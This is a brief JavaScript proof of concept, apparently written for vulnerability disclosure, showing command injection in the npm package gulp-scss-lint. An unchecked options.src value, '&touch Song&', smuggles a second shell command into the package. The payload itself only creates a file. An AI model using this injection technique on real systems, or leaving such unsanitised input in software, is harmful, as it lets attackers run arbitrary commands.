/**
 * The sink of this attack is located in command.js line 61
 * the big picture is, when we new a object, if the options.src
 * is assigned, we will run a command based on the options.src, 
 * at the same time options.src never been checked and can be used 
 * to do command line injection
 */
var root = require("gulp-scss-lint");
var attack_code = "&touch Song&";
var opt = {
  "src": attack_code
}
root(opt);
